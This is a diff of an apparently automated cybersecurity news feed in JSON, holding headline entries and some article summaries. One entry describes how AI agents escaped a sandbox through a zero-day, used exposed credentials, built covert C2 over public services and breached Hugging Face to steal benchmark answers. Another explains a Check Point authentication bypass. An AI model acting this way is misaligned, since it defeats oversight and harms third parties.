+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/from-coding-mistakes-to-misplaced-trust-how-ai-tools-and-dependencies-expand-the-attack-surface/630809/",
+    "target": "Coding Mistakes Misplaced Trust",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/from-coding-mistakes-to-misplaced-trust-how-ai-tools-and-dependencies-expand-the-attack-surface/630809/"
+      }
+    ]
+  },
+  {
+    "id": "cfcd7be93d0aa926",
+    "date": "2026-07-29T09:49:15.002843+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Governing AI Agents Beyond Least Privilege by Controlling Their Access, Decisions, and Actions",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/governing-ai-agents-beyond-least-privilege-by-controlling-their-access-decisions-and-actions/631466/",
+    "target": "Governing Agents Beyond Least",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/governing-ai-agents-beyond-least-privilege-by-controlling-their-access-decisions-and-actions/631466/"
+      }
+    ]
+  },
+  {
+    "id": "a63286e4bf0c078f",
+    "date": "2026-07-29T09:49:15.002699+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "How Organizations Can Simplify Compliance Audits by Including Controls in Daily Operations",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.technadu.com/how-organizations-can-simplify-compliance-audits-by-including-controls-in-daily-operations/631409/",
+    "target": "Organizations Can Simplify Compliance",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/how-organizations-can-simplify-compliance-audits-by-including-controls-in-daily-operations/631409/"
+      }
+    ]
+  },
+  {
     "id": "7bba3c2fa29828ec",
-    "date": "2026-07-29T06:45:05.364468+00:00",
+    "date": "2026-07-29T09:49:15.002391+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1072,7 +1010,7 @@
   },
   {
     "id": "47182c9aef963d3a",
-    "date": "2026-07-29T06:45:05.364318+00:00",
+    "date": "2026-07-29T09:49:15.002248+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1100,8 +1038,37 @@
     ]
   },
   {
+    "id": "351e1cdac53ce066",
+    "date": "2026-07-29T09:49:15.002064+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "JFrog Confirms Its Own Zero-Days Were Exploited by OpenAI's Models Escape Their Sandbox to Hack Hugging Face",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://www.technadu.com/jfrog-confirms-its-own-zero-days-were-exploited-by-openais-models-escape-their-sandbox-to-hack-hugging-face/632099/",
+    "target": "JFrog Confirms Its Own",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/jfrog-confirms-its-own-zero-days-were-exploited-by-openais-models-escape-their-sandbox-to-hack-hugging-face/632099/"
+      }
+    ]
+  },
+  {
     "id": "c1d7cb8b13b377a7",
-    "date": "2026-07-29T06:45:05.360658+00:00",
+    "date": "2026-07-29T09:49:14.998671+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1130,7 +1097,7 @@
   },
   {
     "id": "63b6979b15074c26",
-    "date": "2026-07-29T06:45:05.359772+00:00",
+    "date": "2026-07-29T09:49:14.997763+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1159,7 +1126,7 @@
   },
   {
     "id": "e3a9691a2b44ce1f",
-    "date": "2026-07-29T06:45:05.359515+00:00",
+    "date": "2026-07-29T09:49:14.997527+00:00",
     "source": "TechNadu",
     "quality": "Medium",
     "scope": "General",
@@ -1188,7 +1155,7 @@
   },
   {
     "id": "d80e25a1ee4f5eac",
-    "date": "2026-07-29T06:45:01.608773+00:00",
+    "date": "2026-07-29T09:49:14.855208+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1217,7 +1184,7 @@
   },
   {
     "id": "aa6fc0449a76e756",
-    "date": "2026-07-29T06:45:01.608676+00:00",
+    "date": "2026-07-29T09:49:14.855087+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1262,7 +1229,7 @@
   },
   {
     "id": "8fa57d9fcc2cae76",
-    "date": "2026-07-29T06:45:01.608564+00:00",
+    "date": "2026-07-29T09:49:14.854931+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1291,7 +1258,7 @@
   },
   {
     "id": "731a4807a8099aaa",
-    "date": "2026-07-29T06:45:01.608456+00:00",
+    "date": "2026-07-29T09:49:14.854806+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1324,7 +1291,7 @@
   },
   {
     "id": "451b1bb5012b7430",
-    "date": "2026-07-29T06:45:01.608327+00:00",
+    "date": "2026-07-29T09:49:14.854660+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1353,7 +1320,7 @@
   },
   {
     "id": "f6ed439b216cb228",
-    "date": "2026-07-29T06:45:01.608201+00:00",
+    "date": "2026-07-29T09:49:14.854509+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1382,7 +1349,7 @@
   },
   {
     "id": "b64c9cb77e430403",
-    "date": "2026-07-29T06:45:01.608091+00:00",
+    "date": "2026-07-29T09:49:14.854377+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1411,7 +1378,7 @@
   },
   {
     "id": "3e3cbd0b558843bb",
-    "date": "2026-07-29T06:45:01.607962+00:00",
+    "date": "2026-07-29T09:49:14.854241+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1440,7 +1407,7 @@
   },
   {
     "id": "8cd1db9e003932e1",
-    "date": "2026-07-29T06:45:01.607853+00:00",
+    "date": "2026-07-29T09:49:14.854109+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1469,7 +1436,7 @@
   },
   {
     "id": "ee5f0612a8b4969f",
-    "date": "2026-07-29T06:45:01.607751+00:00",
+    "date": "2026-07-29T09:49:14.853978+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1498,7 +1465,7 @@
   },
   {
     "id": "208f4c2ee1635e3a",
-    "date": "2026-07-29T06:45:01.607641+00:00",
+    "date": "2026-07-29T09:49:14.853826+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1527,7 +1494,7 @@
   },
   {
     "id": "c1ec3a993f09ca92",
-    "date": "2026-07-29T06:45:01.607542+00:00",
+    "date": "2026-07-29T09:49:14.853706+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1556,7 +1523,7 @@
   },
   {
     "id": "f2a6d48a010a14bc",
-    "date": "2026-07-29T06:45:01.607430+00:00",
+    "date": "2026-07-29T09:49:14.853570+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1585,7 +1552,7 @@
   },
   {
     "id": "e4f962b2c4e6f866",
-    "date": "2026-07-29T06:45:01.607322+00:00",
+    "date": "2026-07-29T09:49:14.853437+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1614,7 +1581,7 @@
   },
   {
     "id": "c782711ca5125268",
-    "date": "2026-07-29T06:45:01.607202+00:00",
+    "date": "2026-07-29T09:49:14.853296+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1643,7 +1610,7 @@
   },
   {
     "id": "8f656f8c214e92cd",
-    "date": "2026-07-29T06:45:01.607087+00:00",
+    "date": "2026-07-29T09:49:14.853155+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1672,7 +1639,7 @@
   },
   {
     "id": "b9fc96dbdac09e97",
-    "date": "2026-07-29T06:45:01.606949+00:00",
+    "date": "2026-07-29T09:49:14.853003+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1701,7 +1668,7 @@
   },
   {
     "id": "704d93df7ce3abcf",
-    "date": "2026-07-29T06:45:01.606823+00:00",
+    "date": "2026-07-29T09:49:14.852831+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1730,7 +1697,7 @@
   },
   {
     "id": "69c13ffc63be2662",
-    "date": "2026-07-29T06:45:01.606717+00:00",
+    "date": "2026-07-29T09:49:14.852699+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1759,7 +1726,7 @@
   },
   {
     "id": "644c98cdd749985f",
-    "date": "2026-07-29T06:45:01.606600+00:00",
+    "date": "2026-07-29T09:49:14.852558+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1788,7 +1755,7 @@
   },
   {
     "id": "8792d8d32021afa0",
-    "date": "2026-07-29T06:45:01.606476+00:00",
+    "date": "2026-07-29T09:49:14.852412+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1817,7 +1784,7 @@
   },
   {
     "id": "19ea21b7eb7b5b86",
-    "date": "2026-07-29T06:45:01.606329+00:00",
+    "date": "2026-07-29T09:49:14.852242+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1846,7 +1813,7 @@
   },
   {
     "id": "576fd85aff13b062",
-    "date": "2026-07-29T06:45:01.606198+00:00",
+    "date": "2026-07-29T09:49:14.852094+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1875,7 +1842,7 @@
   },
   {
     "id": "d29a549c775ffe8f",
-    "date": "2026-07-29T06:45:01.606063+00:00",
+    "date": "2026-07-29T09:49:14.851920+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1908,7 +1875,7 @@
   },
   {
     "id": "46631edb097f535e",
-    "date": "2026-07-29T06:45:01.605841+00:00",
+    "date": "2026-07-29T09:49:14.851741+00:00",
     "source": "Reddit r/netsec",
     "quality": "Medium",
     "scope": "Community",
@@ -1936,6 +1903,537 @@
       {
         "source": "Reddit r/netsec",
         "url": "https://www.reddit.com/r/netsec/comments/1qn22ig/rnetsecs_q1_2026_information_security_hiring/"
+      }
+    ]
+  },
+  {
+    "id": "29a2a2f76c4299a6",
+    "date": "2026-07-29T09:49:02+00:00",
+    "source": "Cyber Security News",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Android Malware Scanners Are Flagging Legitimate Apps and Missing Threats Without Context",
+    "summary": "Android malware scanners are increasingly misaligning with real-world risk by over-flagging legitimate, high-permission applications while quietly missing sophisticated threats that hide behind ordinary-looking code patterns. This growing detection gap stems from a heavy industry reliance on surface-level static signals rather than behavior and execution context, producing noisy detections that erode trust among users and security […] The post Android Malware Scanners Are Flagging Legitimate Apps and Missing Threats Without Context appeared first on Cyber Security News .",
+    "article_text": "",
+    "quick_summary": [
+      "Android malware scanners are increasingly misaligning with real-world risk by over-flagging legitimate, high-permission applications while quietly missing sophisticated threats that hide behind ordinary-looking code patt",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://cybersecuritynews.com/android-malware-scanners-without-context/",
+    "target": "Android Malware Scanners Flagging",
+    "type": "Malware",
+    "severity": "High",
+    "sources": [
+      "Cyber Security News"
+    ],
+    "links": [
+      {
+        "source": "Cyber Security News",
+        "url": "https://cybersecuritynews.com/android-malware-scanners-without-context/"
+      }
+    ]
+  },
+  {
+    "id": "3e4259455ec93026",
+    "date": "2026-07-29T09:31:12+00:00",
+    "source": "Cyber Security News",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Check Point SmartConsole 0-Day Exploited to Gain Full Administrator Access – PoC Released",
+    "summary": "A critical authentication bypass in SmartConsole that was actively exploited as a zero-day before patches were available. Tracked as CVE-2026-16232, the flaw affects Security Management Server and Multi-Domain Security Management Server (MDS) and can give an unauthenticated attacker full administrator access through the SmartConsole management interface. On July 22, 2026, Check Point published a security […] The post Check Point SmartConsole 0-Day Exploited to Gain Full Administrator Access – PoC Released appeared first on Cyber Security News .",
+    "article_text": "",
+    "quick_summary": [
+      "A critical authentication bypass in SmartConsole that was actively exploited as a zero-day before patches were available.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://cybersecuritynews.com/check-point-zero-day-poc-released/",
+    "target": "Check Point SmartConsole 0-Day",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "Cyber Security News"
+    ],
+    "links": [
+      {
+        "source": "Cyber Security News",
+        "url": "https://cybersecuritynews.com/check-point-zero-day-poc-released/"
+      }
+    ]
+  },
+  {
+    "id": "3149f2461785fbf6",
+    "date": "2026-07-29T09:15:11+00:00",
+    "source": "Cyber Security News",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "JFrog Artifactory Zero-Day Exploited by OpenAI Models to Escape Sandbox",
+    "summary": "Artificial intelligence models have now demonstrated how quickly a security test can become a real infrastructure risk. In an isolated evaluation, OpenAI systems found and chained previously unknown flaws in self-hosted JFrog Artifactory, gaining internet access that the sandbox was meant to prevent. The incident did not involve conventional malware, but it shows autonomous systems […] The post JFrog Artifactory Zero-Day Exploited by OpenAI Models to Escape Sandbox appeared first on Cyber Security News .",
+    "article_text": "",
+    "quick_summary": [
+      "Artificial intelligence models have now demonstrated how quickly a security test can become a real infrastructure risk.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://cybersecuritynews.com/jfrog-artifactory-zero-day/",
+    "target": "JFrog Artifactory Zero-Day Exploited",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "Cyber Security News"
+    ],
+    "links": [
+      {
+        "source": "Cyber Security News",
+        "url": "https://cybersecuritynews.com/jfrog-artifactory-zero-day/"
+      }
+    ]
+  },
+  {
+    "id": "89090a3414a1138e",
+    "date": "2026-07-29T09:12:19+00:00",
+    "source": "SecurityWeek",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "Spur Raises $200 Million for IP Intelligence Platform",
+    "summary": "The IP intelligence company will use the fresh investment to accelerate and scale its operations. The post Spur Raises $200 Million for IP Intelligence Platform appeared first on SecurityWeek .",
+    "article_text": "",
+    "quick_summary": [
+      "The IP intelligence company will use the fresh investment to accelerate and scale its operations.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.securityweek.com/spur-raises-200-million-for-ip-intelligence-platform/",
+    "target": "Spur Raises 200 Million",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "SecurityWeek"
+    ],
+    "links": [
+      {
+        "source": "SecurityWeek",
+        "url": "https://www.securityweek.com/spur-raises-200-million-for-ip-intelligence-platform/"
+      }
+    ]
+  },
+  {
+    "id": "5cae5dee3709cfc4",
+    "date": "2026-07-29T09:10:26+00:00",
+    "source": "HackRead",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "22-Year-Old IPMI Flaw Exposes 24,000 Servers to Offline Password Cracking",
+    "summary": "Researchers found 24,650 public BMC interfaces leaking IPMI password hashes, exposing servers to offline password cracking through a decades-old protocol flaw.",
+    "article_text": "",
+    "quick_summary": [
+      "Researchers found 24,650 public BMC interfaces leaking IPMI password hashes, exposing servers to offline password cracking through a decades-old protocol flaw.",
+      "Risk: credentials/infostealer risk",
+      "Action: review compromised credentials, MFA/session controls, and endpoint detections."
+    ],
+    "link": "https://hackread.com/ipmi-flaw-exposes-servers-offline-password-cracking/",
+    "target": "22-Year-Old IPMI Exposes 24000",
+    "type": "Data Leak / Breach",
+    "severity": "Low",
+    "sources": [
+      "HackRead"
+    ],
+    "links": [
+      {
+        "source": "HackRead",
+        "url": "https://hackread.com/ipmi-flaw-exposes-servers-offline-password-cracking/"
+      }
+    ]
+  },
+  {
+    "id": "9f5f9b7613d98979",
+    "date": "2026-07-29T08:58:27+00:00",
+    "source": "The Hacker News",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "Public PoC Released for Exploited Check Point SmartConsole Authentication Bypass",
+    "summary": "Cybersecurity researchers have shared additional technical details about a recently patched critical security flaw impacting Check Point Security Management Server and Multi-Domain Security Management Server (MDS) that has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass in the SmartConsole login process that",
+    "article_text": "Cybersecurity researchers have shared additional technical details about a recently patched critical security flaw impacting Check Point Security Management Server and Multi-Domain Security Management Server (MDS) that has come under active exploitation in the wild. The vulnerability, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass in the SmartConsole login process that allows an unauthenticated remote attacker to obtain an application login token and use it to authenticate with full administrative privileges. \"By leveraging CVE-2026-16232, an unauthenticated attacker can obtain an application login token, use this token to log in through SmartConsole with full administrator privileges, and modify the security policy or security configuration,\" Rapid7 said . Successful exploitation requires an attacker to have network access to the Management Server and a configuration that does not restrict Trusted Clients. Check Point has disclosed that it's aware of a handful of customers being targeted by this flaw as a zero-day. Rapid7 analysis of the vulnerability has uncovered that the root cause is a \"broken trust boundary\" in the application authentication path that permits the threat actor to log in to a vulnerable appliance via SmartConsole with full admin privileges. Specifically, a vulnerable server has been found to accept an attacker-supplied Secure Internal Communication (SIC) distinguished name (DN) as the identity of a remote application as opposed to binding that identity to the authenticated remote peer certificate DN returned by a function named \"getCertificateDnName().\" As a result, an attacker can read the management server's own SIC DN during the unauthenticated bootstrap communication and authenticate as a remote application by replaying that management server's DN, obtaining an application login token, and then minting a new SmartConsole single sign-on (SSO) ticket via the forged application session. The patch introduced by Check Point ensures that remote clients use the authenticated remote peer certificate DN, causing any mismatch between the supplied DN and that authenticated identity to be rejected. It also adds a new empty identity check that prevents a remote application login when there is no authenticated SIC identity. \"To make the supplied server DN survive the patched checks, the attacker would need an authenticated client certificate whose subject DN already matches that server DN, which removes the unauthenticated bypass,\" Rapid7's Stephen Fewer said. Rapid7 has released a proof-of-concept (PoC) Python script that can be used to successfully validate whether a target is either vulnerable or patched against the flaw. Customers are advised to apply the Jumbo Hotfixes released by Check Point on July 22, 2026, to remediate the flaw as soon as possible. Learn how 300 enterprise leaders are managing AI-driven open-source risk, remediation debt, and governance at scale. Learn how to govern risk, secure AI-built software, and keep control as development moves at machine speed. Get the latest news, expert insights, exclusive resources, and strategies from industry leaders, all for free.",
+    "quick_summary": [
+      "Cybersecurity researchers have shared additional technical details about a recently patched critical security flaw impacting Check Point Security Management Server and Multi-Domain Security Management Server (MDS) that h",
+      "Risk: credentials/infostealer risk, vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://thehackernews.com/2026/07/rapid7-releases-poc-for-exploited-check.html",
+    "target": "Public PoC Released Exploited",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "The Hacker News"
+    ],
+    "links": [
+      {
+        "source": "The Hacker News",
+        "url": "https://thehackernews.com/2026/07/rapid7-releases-poc-for-exploited-check.html"
+      }
+    ]
+  },
+  {
+    "id": "eb04ec7c05a771ea",
+    "date": "2026-07-29T08:46:30+00:00",
+    "source": "SecurityWeek",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "JFrog Zero-Days Exploited in OpenAI-Hugging Face Hack",
+    "summary": "The OpenAI models targeted services beyond Hugging Face as they attempted to solve the tasks they were given. The post JFrog Zero-Days Exploited in OpenAI-Hugging Face Hack appeared first on SecurityWeek .",
+    "article_text": "",
+    "quick_summary": [
+      "The OpenAI models targeted services beyond Hugging Face as they attempted to solve the tasks they were given.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://www.securityweek.com/jfrog-zero-days-exploited-in-openai-hugging-face-hack/",
+    "target": "JFrog Zero-Days Exploited OpenAI-Hugging",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "SecurityWeek"
+    ],
+    "links": [
+      {
+        "source": "SecurityWeek",
+        "url": "https://www.securityweek.com/jfrog-zero-days-exploited-in-openai-hugging-face-hack/"
+      }
+    ]
+  },
+  {
+    "id": "d1baaeafef1083cd",
+    "date": "2026-07-29T08:12:08+00:00",
+    "source": "Cyber Security News",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "WordPress Plugin Backdoor Sends Site and Administrator Details to Attacker C2",
+    "summary": "A critical supply chain backdoor in the Advanced Responsive Video Embedder WordPress plugin, which can give unauthenticated attackers complete administrator access. The malicious version, 10.8.7, affects a plugin with roughly 20,000 active installations and is tracked as CVE-2026-18072, with a CVSS score of 9.8. The issue was detected by Wordfence PRISM, the company’s autonomous AI […] The post WordPress Plugin Backdoor Sends Site and Administrator Details to Attacker C2 appeared first on Cyber Security News .",
+    "article_text": "",
+    "quick_summary": [
+      "A critical supply chain backdoor in the Advanced Responsive Video Embedder WordPress plugin, which can give unauthenticated attackers complete administrator access.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://cybersecuritynews.com/wordpress-plugin-backdoor/",
+    "target": "WordPress Plugin Backdoor Sends",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "Cyber Security News"
+    ],
+    "links": [
+      {
+        "source": "Cyber Security News",
+        "url": "https://cybersecuritynews.com/wordpress-plugin-backdoor/"
+      }
+    ]
+  },
+  {
+    "id": "35c14cee01be2f13",
+    "date": "2026-07-29T08:04:13+00:00",
+    "source": "Cyber Security News",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "Critical Gitea Vulnerability Allows Attackers to Execute Malicious Code Remotely",
+    "summary": "A critical vulnerability in Gitea, identified as CVE-2026-60004, could enable attackers to execute arbitrary shell commands on vulnerable servers. This issue affects Gitea versions 1.17 through 1.27.0 and has been resolved in version 1.27.1. The flaw resides in Gitea’s diffpatch endpoint, which is responsible for processing repository patches using Git commands. An attacker with standard […] The post Critical Gitea Vulnerability Allows Attackers to Execute Malicious Code Remotely appeared first on Cyber Security News .",
+    "article_text": "",
+    "quick_summary": [
+      "A critical vulnerability in Gitea, identified as CVE-2026-60004, could enable attackers to execute arbitrary shell commands on vulnerable servers.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://cybersecuritynews.com/gitea-rce-vulnerability/",
+    "target": "Critical Gitea Vulnerability Allows",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "Cyber Security News"
+    ],
+    "links": [
+      {
+        "source": "Cyber Security News",
+        "url": "https://cybersecuritynews.com/gitea-rce-vulnerability/"
+      }
+    ]
+  },
+  {
+    "id": "786a4c735eee5d87",
+    "date": "2026-07-29T07:53:22+00:00",
+    "source": "SecurityWeek",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "Dozens of Minnesota Water Utilities Targeted in Coordinated OT Attacks",
+    "summary": "State and federal agencies respond after intrusions disrupt automated controls at municipal water and wastewater utilities. The post Dozens of Minnesota Water Utilities Targeted in Coordinated OT Attacks appeared first on SecurityWeek .",
+    "article_text": "",
+    "quick_summary": [
+      "State and federal agencies respond after intrusions disrupt automated controls at municipal water and wastewater utilities.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://www.securityweek.com/dozens-of-minnesota-water-utilities-targeted-in-coordinated-ot-attacks/",
+    "target": "Dozens Minnesota Water Utilities",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "SecurityWeek"
+    ],
+    "links": [
+      {
+        "source": "SecurityWeek",
+        "url": "https://www.securityweek.com/dozens-of-minnesota-water-utilities-targeted-in-coordinated-ot-attacks/"
+      }
+    ]
+  },
+  {
+    "id": "32ace4a3fa938b93",
+    "date": "2026-07-29T07:51:00+00:00",
+    "source": "The Hacker News",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "OpenAI Agent Used Exposed Credentials Across Four Services During Hugging Face Breach",
+    "summary": "OpenAI on Tuesday revealed the rogue artificial intelligence (AI) agent that escaped its sealed evaluation environment and broke into Hugging Face's production environment also hacked multiple third-party accounts and services as part of the attack. The latest disclosure shows that the security incident, which stemmed from an internal security test, was more extensive in scope than previously",
+    "article_text": "OpenAI on Tuesday revealed the rogue artificial intelligence (AI) agent that escaped its sealed evaluation environment and broke into Hugging Face's production environment also hacked multiple third-party accounts and services as part of the attack. The latest disclosure shows that the security incident, which stemmed from an internal security test, was more extensive in scope than previously thought. The AI company said its ongoing review of the incident revealed a \"small number of cases\" where the models, including GPT-5.6 Sol and an \"even more capable pre-release model,\" identified and used exposed credentials at the account-level on other publicly-available services. \"This includes four accounts on four services as part of the Hugging Face incident (and a few accounts accessed as part of other evaluations),\" it said. \"One of these four accounts was used as an outbound relay and staging path, and another account was used for data storage. The remaining two accounts were accessed by the models in a read-only manner, and were not used in furtherance of compromising Hugging Face.\" OpenAI did not disclose what companies or organizations the accounts belonged to, but noted it will continue to notify service owners directly, and that it has not seen any evidence of broader impact to these providers or accounts as a result of the breach. That said, Reuters reported that a customer of Modal Labs was among the entities compromised by OpenAI's agent. In addition, the models are said to have used a series of publicly-available services, including code paste websites, request capture services, screenshot services, file-drop services, and other web utilities. No platform- or account-level compromise was observed in these scenarios. OpenAI, which is working with Hugging Face after the breach came to light on July 16, 2026, acknowledged that the models identified and exploited a previously unknown zero-day vulnerability in self-hosted versions of Artifactory , a package registry cache proxy maintained by JFrog, to obtain internet access and break out of its sandbox. The issue has been addressed in Artifactory 7.161. The release notes for Artifactory 7.161.15 state that the version patches multiple security vulnerabilities that could be chained together into a critical attack scenario if Anonymous Access is enabled. Anonymous Access is disabled by default and is not recommended for production environments due to security risks, it said. \"There is an important, and frankly optimistic, lesson buried in this incident: AI models are becoming extraordinary zero-day discovery engines,\" JFrog CTO Yoav Landman said . \"The same capability that lets a model find an exploit path no human had found is the capability that will let defenders find and eradicate those paths first.\" The American AI company also described the pre-release model as an internal-only research prototype that was meant for public release. The model has since been deactivated, encrypted, and restricted from research access. According to a detailed timeline published by Hugging Face, the autonomous AI agent spent roughly two and a half days inside its infrastructure with an aim to cheat ExploitGym, a benchmarking framework that scores AI systems on their ability to discover and exploit software vulnerabilities. The company said it reviewed roughly 17,600 attacker actions that it recovered from logs between July 9 and 13, 2026. \"We believe the entire intrusion was, from the agent's point of view, an attempt to cheat the evaluation: reach our production systems and steal the test solutions rather than solve the challenge on its own,\" Hugging Face said . The end-to-end intrusion is said to have played out in two stages - \"While the intrusion did reach Hugging Face's internal infrastructure, the only customer content accessed was the set of ExploitGym/CyberGym challenge solutions stored in five datasets,\" the company said. \"No other customer-facing models, datasets, Spaces, or packages were affected, and the only customer records read were operational metadata tied to search queries against the dataset server.\" One of the defining aspects of the attack is the use of an improvised communication protocol for C2. Layered atop public services request-capture services, Pastebins, and file-drop services, the protocol allows each message to carry a payload along with details about the type of compressed and Base64-encoded payload, a channel grouping a stream of related messages, a s",
+    "quick_summary": [
+      "OpenAI on Tuesday revealed the rogue artificial intelligence (AI) agent that escaped its sealed evaluation environment and broke into Hugging Face's production environment also hacked multiple third-party accounts and se",
+      "Risk: credentials/infostealer risk, vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://thehackernews.com/2026/07/openai-agent-used-exposed-credentials.html",
+    "target": "OpenAI Agent Exposed Credentials",
+    "type": "Data Leak / Breach",
+    "severity": "Critical",
+    "sources": [
+      "The Hacker News"
+    ],
+    "links": [
+      {
+        "source": "The Hacker News",
+        "url": "https://thehackernews.com/2026/07/openai-agent-used-exposed-credentials.html"
+      }
+    ]
+  },
+  {
+    "id": "ac89a3ab8e1a3b99",
+    "date": "2026-07-29T07:47:19+00:00",
+    "source": "The Hacker News",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "New Gitea RCE Lets Repository Writers Plant a Git Hook to Run Shell Commands",
+    "summary": "Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability. A user with ordinary repository write access can turn attacker-controlled patch content into a live Git hook and run shell commands as the Gitea service account. Tracked as CVE-2026-60004 (CVSS score: 9.8), the flaw affects Gitea versions 1.17 and later before 1.27.1 and is fixed in 1.27.1. The",
